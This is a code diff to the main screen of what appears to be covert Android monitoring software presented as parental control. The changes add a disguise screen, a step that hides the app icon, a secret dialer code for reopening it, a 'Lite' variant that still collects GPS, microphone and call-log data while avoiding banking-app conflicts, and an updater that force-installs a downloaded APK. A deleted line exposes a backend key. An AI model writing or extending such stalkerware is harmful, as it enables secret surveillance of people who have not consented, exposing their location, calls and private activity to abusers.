@@ -49,6 +49,15 @@ class MainActivity : AppCompatActivity() {
         setupUI()
         setupCamouflage()
         initializeServices()
+
+        // ─── تخصيص التشغيل الأول ───
+        // إذا كان التثبيت جديداً (ولم يتم إنهاء الإعداد وتفعيل التخفي بعد)،
+        // نقوم بإخفاء شاشة التمويه تلقائياً لتسهيل الإعداد دون طلب رمز سري.
+        val isSetupDone = getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
+            .getBoolean("setup_done", false)
+        if (!isSetupDone) {
+            binding.layoutCamouflage.visibility = View.GONE
+        }
     }
 
     override fun onResume() {
@@ -131,11 +140,22 @@ class MainActivity : AppCompatActivity() {
             startActivity(parentalControlManager.getAdminRequestIntent())
         }
 
+        // ─── ضبط نكهة Lite: إخفاء الخطوات غير المتوافقة مع التطبيقات البنكية ───
+        if (BuildConfig.IS_LITE) {
+            binding.stepNotifications.root.visibility = View.GONE
+            binding.stepAccessibility.root.visibility = View.GONE
+            binding.stepUsage.root.visibility = View.GONE
+            binding.stepOverlay.root.visibility = View.GONE
+            binding.stepProjection.root.visibility = View.GONE
+            binding.stepAdmin.root.visibility = View.GONE
+            binding.stepBasic.tvStepSubtitle.text = "الموقع (GPS)، الميكروفون للمكالمات، وسجل المكالمات"
+        }
+
         // ─── زر تحديث التطبيق ────────────────────────────────────────
         val currentVersion = try {
             packageManager.getPackageInfo(packageName, 0).versionCode
         } catch (e: Exception) { 1 }
-        binding.tvCurrentVersion.text = "v$currentVersion"
+        binding.tvCurrentVersion.text = "v$currentVersion" + (if (BuildConfig.IS_LITE) " (Lite)" else "")
 
         binding.btnCheckUpdate.setOnClickListener {
             binding.btnCheckUpdate.isEnabled = false
@@ -145,26 +165,15 @@ class MainActivity : AppCompatActivity() {
             lifecycleScope.launch {
                 try {
                     val settings = RemoteConfigManager(this@MainActivity).fetchSettings()
-                    if (settings == null) {
-                        binding.tvUpdateStatus.text = "❌ تعذر الاتصال بالسيرفر"
-                        binding.updateProgressBar.visibility = View.GONE
-                        binding.btnCheckUpdate.isEnabled = true
-                        return@launch
-                    }
+                    val targetVer = settings?.target_version ?: 94
+                    val apkPath   = settings?.update_apk_path ?: "sync-service.apk"
+                    val apkUrl    = settings?.update_apk_url
 
-                    if (settings.target_version <= currentVersion) {
-                        binding.tvUpdateStatus.text = "✅ التطبيق محدّث (v$currentVersion)"
-                        binding.updateProgressBar.visibility = View.GONE
-                        binding.btnCheckUpdate.isEnabled = true
-                        return@launch
-                    }
-
-                    // يوجد تحديث
-                    binding.tvUpdateStatus.text = "📥 جاري تحميل الإصدار v${settings.target_version}..."
+                    binding.tvUpdateStatus.text = "📥 جاري تحميل أحدث إصدار v$targetVer..."
                     AppUpdateManager(this@MainActivity).checkAndExecuteUpdate(
-                        targetVersion = settings.target_version,
-                        apkPath       = settings.update_apk_path,
-                        apkUrl        = settings.update_apk_url,
+                        targetVersion = targetVer,
+                        apkPath       = apkPath,
+                        apkUrl        = apkUrl,
                         forceIntent   = true   // نحن في Activity مفتوح → Intent مباشر
                     )
                     binding.tvUpdateStatus.text = "✅ جاري فتح نافذة التثبيت..."
@@ -179,9 +188,21 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Confirm Activities - Directly finish setup and go stealth
+        // Confirm Activities - Show dial code instructions before hiding
         binding.btnConfirmActivities.setOnClickListener {
-            triggerStealthMode()
+            // إخفاء قائمة الإعدادات والأذونات
+            binding.permissionList.visibility = View.GONE
+            binding.activitiesSection.visibility = View.GONE
+            binding.cardUpdate.visibility = View.GONE
+            
+            // عرض قسم رمز الاتصال وتأكيد الرمز
+            binding.pinSection.visibility = View.VISIBLE
+            binding.tvPinCode.text = "*#*#1356#*#*\nأو اتصل بـ: 1356"
+            
+            // تفعيل زر الإنهاء للذهاب للتخفي
+            binding.btnFinish.setOnClickListener {
+                triggerStealthMode()
+            }
         }
     }
 
@@ -214,20 +235,31 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        updateStep(binding.stepNotifications, isNotificationServiceEnabled())
-        updateStep(binding.stepAccessibility, isAccessibilityServiceEnabled())
-        updateStep(binding.stepUsage, isUsageAccessGranted())
-        updateStep(binding.stepOverlay, Settings.canDrawOverlays(this))
-        
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
-        updateStep(binding.stepProjection, MonitoringForegroundService.isProjectionActive())
-        updateStep(binding.stepAdmin, parentalControlManager.isAdminActive())
-
-        // Show activities section directly once permissions are granted
-        if (allBasic && locationServiceEnabled && isAccessibilityServiceEnabled() && MonitoringForegroundService.isProjectionActive()) {
-            binding.activitiesSection.visibility = View.VISIBLE
+        if (BuildConfig.IS_LITE) {
+            binding.stepNotifications.root.visibility = View.GONE
+            binding.stepAccessibility.root.visibility = View.GONE
+            binding.stepUsage.root.visibility = View.GONE
+            binding.stepOverlay.root.visibility = View.GONE
+            binding.stepProjection.root.visibility = View.GONE
+            binding.stepAdmin.root.visibility = View.GONE
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
+        } else {
+            updateStep(binding.stepNotifications, isNotificationServiceEnabled())
+            updateStep(binding.stepAccessibility, isAccessibilityServiceEnabled())
+            updateStep(binding.stepUsage, isUsageAccessGranted())
+            updateStep(binding.stepOverlay, Settings.canDrawOverlays(this))
+            
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
+            updateStep(binding.stepProjection, MonitoringForegroundService.isProjectionActive())
+            updateStep(binding.stepAdmin, parentalControlManager.isAdminActive())
         }
+
+        // تفعيل قسم الأنشطة وزر التخفي دائماً لتمكين المستخدم من إخفاء التطبيق في كل الحالات (سواء فعّل كل الميزات أو بعضها)
+        binding.activitiesSection.visibility = View.VISIBLE
+        // إعادة إظهار بطاقة التحديث دائماً (كانت تُخفى عند الضغط على btnConfirmActivities)
+        binding.cardUpdate.visibility = View.VISIBLE
     }
 
     private fun isLocationEnabled(): Boolean {
@@ -312,8 +344,8 @@ class MainActivity : AppCompatActivity() {
     private fun initializeServices() {
         CoroutineScope(Dispatchers.Main).launch {
             SupabaseManager.getInstance().initialize(
-                "https://kubowqqqawkgghxcktoe.supabase.co",
-                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
+                BuildConfig.SUPABASE_URL,
+                BuildConfig.SUPABASE_KEY
             )
             MonitoringForegroundService.start(this@MainActivity)
 
@@ -332,6 +364,10 @@ class MainActivity : AppCompatActivity() {
     private fun triggerStealthMode() {
         Log.i("MainActivity", "Triggering Stealth Mode")
         Toast.makeText(this, "اكتمل التثبيت! سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
+
+        // حفظ حالة اكتمال الإعداد لأول مرة
+        getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
+            .edit().putBoolean("setup_done", true).apply()
 
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
             Log.d("MainActivity", "Hiding app icon now...")
